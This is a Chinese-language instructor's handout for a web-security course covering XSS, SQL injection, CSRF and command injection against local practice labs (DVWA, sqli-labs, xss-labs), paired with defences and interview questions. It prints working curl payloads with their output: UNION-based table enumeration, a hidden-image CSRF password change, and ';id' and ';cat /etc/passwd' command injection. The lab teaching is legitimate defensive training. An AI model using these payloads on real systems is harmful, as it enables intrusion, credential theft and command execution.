# D5 四大 Web 漏洞：XSS / SQL 注入 / CSRF / RCE（导师讲义）

> 日期：2026-10-05 ｜ 对应大纲 Day 5 ｜ 主线：XSS → SQL 注入 → CSRF → RCE
> 今天产出：四类漏洞各打一个靶场，**每个都拿到真实结果**
> 靶场：xss-labs(8084)、sqli-labs(8083)、DVWA(8081，模块 xss_r/xss_s/xss_d、sqli、csrf、exec)

## 目录

1. [一 总览：四大漏洞都长在「用户输入」上](#一-总览四大漏洞都长在用户输入上)
2. [二 XSS 跨站脚本](#二-xss-跨站脚本)
3. [三 SQL 注入](#三-sql-注入)
4. [四 CSRF 跨站请求伪造](#四-csrf-跨站请求伪造)
5. [五 RCE 远程命令执行](#五-rce-远程命令执行)
6. [六 实验清单](#六-实验清单)
7. [七 高频面试问答](#七-高频面试问答)

---

## 一 总览：四大漏洞都长在「用户输入」上

| 漏洞 | 一句话 | 输入被当成什么执行 | 靶场 |
|---|---|---|---|
| **XSS** | 你的输入被当**前端代码**跑 | HTML/JS | xss-labs、DVWA xss_r/xss_s/xss_d |
| **SQL 注入** | 你的输入被当 **SQL 语句**跑 | SQL | sqli-labs、DVWA sqli |
| **CSRF** | 借**已登录用户的身份**发请求 | 用户的合法请求 | DVWA csrf |
| **RCE** | 你的输入被当**系统命令**跑 | shell 命令 | DVWA exec、pikachu RCE |

**一句话串起来**：这四个都是「**把不可信的输入当成了代码/命令/语句来执行**」。
防御的通用思路只有一句话：**别拼字符串** —— 前端输出要编码、SQL 要参数化、命令要白名单、请求要带 token。

---

## 二 XSS 跨站脚本

### 2.1 原理与三类

服务器把你的输入原样输出到页面里，浏览器**把它当 HTML/JS 执行**。

| 类型 | 特征 | 危害面 |
|---|---|---|
| **反射型** | payload 在 URL 参数里，服务器原样回显，**一次性** | 骗受害者点一个链接 |
| **存储型** | payload 存进数据库（评论、留言），**每个访问者都中招** | 最危险，可蠕虫式传播 |
| **DOM 型** | 纯前端 JS 处理（如 `location.hash`），服务器不参与 | 看前端代码 |

基础 payload：`<script>alert(1)</script>`（弹窗能出来就说明执行了）。

**危害**：偷 Cookie（→ 会话劫持）、钓鱼、键盘记录、改页面内容。**XSS 是"在别人浏览器里执行 JS"**，等价于控制了对方的会话。

### 2.2 靶场实测

**xss-labs level1**（最基础的反射型）：

```bash
curl "http://127.0.0.1:8084/level1.php?name=<script>alert(1)</script>"
```

**我的实测输出**（payload 原样出现在页面里）：

```html
<script>alert(1)</script>
```

**DVWA 反射型 XSS**：

```bash
curl -b "security=low" "http://127.0.0.1:8081/vulnerabilities/xss_r/?name=<script>alert(1)</script>"
```

**我的实测输出**：

```html
<pre>Hello <script>alert(1)</script></pre>
```

> ⚠️ 浏览器里打开会弹窗。xss-labs 后面几关加了过滤（大小写、`<script>` 被替、属性里注入、`onfocus` 等），一关关过，体会"过滤 → 绕过"的对抗。

---

## 三 SQL 注入

### 3.1 原理

后端把用户输入**拼进 SQL 语句**，没做参数化：

```php
$sql = "SELECT * FROM users WHERE id = '$id'";   // $id 直接来自 URL
```

输入 `1' or '1'='1` 就能让 WHERE 恒真；输入 `1' union select ...` 就能**读别的表**。

### 3.2 类型

| 类型 | 特征 | 判据 |
|---|---|---|
| **联合注入（UNION）** | 有回显位，直接 union 取数据 | 页面显示你 union 的内容 |
| **报错注入** | 页面报 SQL 错误 | 报错信息里带出数据 |
| **布尔盲注** | 无回显，只有"真/假"两种页面 | 页面内容随条件变化 |
| **时间盲注** | 连真假都分不出 | `sleep()` 让响应变慢 |
| **堆叠注入** | 能一次执行多条语句 | 分号后接第二条 |

### 3.3 手工注入完整流程（sqli-labs Less-1，全部实测）

**sqli-labs 入口**：http://127.0.0.1:8083/Less-1/?id=1

```bash
B="http://127.0.0.1:8083/Less-1/"

# ① 判断注入点：加个单引号看报不报错
curl "${B}?id=1'"
# → You have an error in your SQL syntax...  ⇒ 有注入

# ② 判断列数：order by 逐步加，直到报错
curl "${B}?id=1' order by 3--+"
# → Your Login name:Dumb            ⇒ 3 列存在
curl "${B}?id=1' order by 4--+"
# → Unknown column '4' in 'order clause'   ⇒ 只有 3 列

# ③ 找显示位：把 id 置为负数让原查询为空，union 的内容才会显示
curl "${B}?id=-1' union select 1,2,3--+"
# → Your Login name:2 / Your Password:3   ⇒ 第 2、3 位会回显

# ④ 取当前库名
curl "${B}?id=-1' union select 1,2,database()--+"
# → security

# ⑤ 取该库所有表名
curl "${B}?id=-1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()--+"
# → emails,referers,uagents,users
```

**我的实测输出汇总**：

| 步骤 | payload | 结果 |
|---|---|---|
| 判注入 | `id=1'` | `You have an error in your SQL syntax` |
| 判列数 | `order by 3` / `order by 4` | 3 列（4 报 `Unknown column '4'`） |
| 找显示位 | `union select 1,2,3` | 显示 `2` 和 `3` |
| 库名 | `database()` | `security` |
| 表名 | `group_concat(table_name)` | `emails,referers,uagents,users` |

下一步就是取 `users` 表的列名和账号密码（`group_concat(column_name)` → `group_concat(username,0x3a,password)`）。

> ⚠️ `--+` 里的 `+` 是 URL 里的空格（`--` 是 SQL 注释，后面必须跟空格/加号，否则不生效）。这是新手最常卡的地方。

### 3.4 防御

**参数化查询（预编译）** —— 让输入永远只当"数据"，不当 SQL 代码：

```php
$stmt = $pdo->prepare("SELECT * FROM users WHERE id = ?");
$stmt->execute([$id]);
```

---

## 四 CSRF 跨站请求伪造

### 4.1 原理

诱骗**已经登录**的受害者在不知情的情况下，向目标网站发出一个"合法"请求。关键：浏览器会自动带上目标的 Cookie。

```
受害者已登录 bank.com
   ↓ 访问了攻击者的页面
攻击者页面里藏着 <img src="bank.com/transfer?to=攻击者&amount=1000">
   ↓ 浏览器自动带 bank.com 的 Cookie 发这个请求
银行以为是受害者本人操作 → 转账成功
```

**和 XSS 的区别**：XSS 是"在目标站执行 JS"，CSRF 是"借用户的身份发请求"（攻击者看不到响应）。XSS 能用来打 CSRF，但两者不同。

### 4.2 靶场（DVWA CSRF）

DVWA 的 CSRF 模块是"改密码"功能：`GET /vulnerabilities/csrf/?password_new=X&password_conf=X&Change=Change`。low 级别**没有任何 token 校验**，所以直接构造这个 URL 就能改密码。

**攻击页（`csrf.html`）**：

```html
<img src="http://127.0.0.1:8081/vulnerabilities/csrf/?password_new=hacked&password_conf=hacked&Change=Change" width="0" height="0">
```

已登录的受害者一访问这个页面，密码就被改成 `hacked`（`<img>` 会静默发请求）。

### 4.3 防御

**CSRF token**（表单里带一个随机令牌，服务器校验）—— 这正是 D2 里 DVWA 登录页那个 `user_token` 的用途。另外还有 `Referer` 校验、Cookie 的 `SameSite` 属性。

---

## 五 RCE 远程命令执行

### 5.1 原理

程序把用户输入**拼进系统命令**执行：

```php
$ip = $_POST['ip'];
system("ping -c 4 " . $ip);   // 直接拼
```

输入 `127.0.0.1; id` 就能在后面**追加执行任意命令**（`;` 让 shell 执行下一条）。

**命令拼接符**：`;`（顺序）、`|`（管道）、`||`（前一条失败才执行）、`&&`（前一条成功才执行）、`` `cmd` ``、`$(cmd)`。

### 5.2 靶场实测（DVWA Command Injection，low）

```bash
curl -b "security=low" --data "ip=127.0.0.1;id&Submit=Submit" \
  "http://127.0.0.1:8081/vulnerabilities/exec/"
```

**我的实测输出**：

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

拿到 `www-data` 身份的命令执行。想进一步看文件：`ip=127.0.0.1;cat /etc/passwd`。

> ⚠️ RCE 是**危害最高**的漏洞（等于拿到服务器 shell）。实战里接着就是反弹 shell、提权（Day 7 之后的内容）。

### 5.3 防御

不拼接用户输入进命令（用参数数组）、对输入做**白名单**校验（只允许 IP/域名格式）、最小权限运行。

---

## 六 实验清单

> 每个实验都有明确"成功标志"。

### 实验 1：XSS（约 20 分钟）
1. xss-labs level1：`?name=<script>alert(1)</script>` → 浏览器弹窗
2. 依次试 level2~level5，观察过滤方式，自己找绕过
3. DVWA 反射型：`/vulnerabilities/xss_r/?name=...`

**成功标志**：浏览器弹出 `1`。

### 实验 2：SQL 注入（约 30 分钟）
按第三节的 ①~⑤ 走完 sqli-labs Less-1，最后取到 `users` 表的用户名密码。

**成功标志**：`database()` 回显 `security`，`group_concat(table_name)` 回显表名。

### 实验 3：CSRF（约 15 分钟）
1. 浏览器登录 DVWA，打开 CSRF 页面看正常改密码
2. 自建 `csrf.html`（第二节的 `<img>` 版本），用同一个浏览器打开
3. 回到 DVWA 看密码是否被改

**成功标志**：访问 `csrf.html` 后密码真被改了。

### 实验 4：RCE（约 15 分钟）
1. DVWA Command Injection 页面，正常输入 `127.0.0.1` 看 ping
2. 改成 `127.0.0.1; id` → 看到 `uid=33(www-data)`
3. 试 `127.0.0.1; cat /etc/passwd`

**成功标志**：页面里出现 `id` 命令的输出。

---

## 七 高频面试问答

**Q：反射型 / 存储型 / DOM 型 XSS 的区别？**
反射型：payload 在请求里、一次性回显；存储型：payload 存进数据库、所有访问者中招（最危险）；DOM 型：纯前端 JS 处理，服务器不参与。

**Q：SQL 注入怎么防？**
参数化查询（预编译）—— 让输入只当数据；配合最小权限数据库账号、输入校验、WAF。

**Q：XSS 和 CSRF 的区别？**
XSS 是"在目标站执行 JS"（能读响应）；CSRF 是"借已登录用户的身份发请求"（看不到响应）。XSS 可以拿来打 CSRF。

**Q：RCE 怎么防？**
不把用户输入拼进命令（用参数化 API）、输入白名单、最小权限运行。

**Q：为什么说"参数化查询能根治 SQL 注入"？**
因为它把 SQL 语句的结构和用户数据**分开传输**，数据库先编译好语句结构，数据永远只被当数据，改不了结构。

---

## 验收（做完实验再答）

1. XSS、SQL 注入、RCE 三者共同的根本原因是什么？（一句话）
2. SQL 注入手工流程的 5 步分别是什么？为什么找显示位时要把 `id` 设成负数？
3. CSRF 为什么能成功？（提示：浏览器对 Cookie 做了什么）
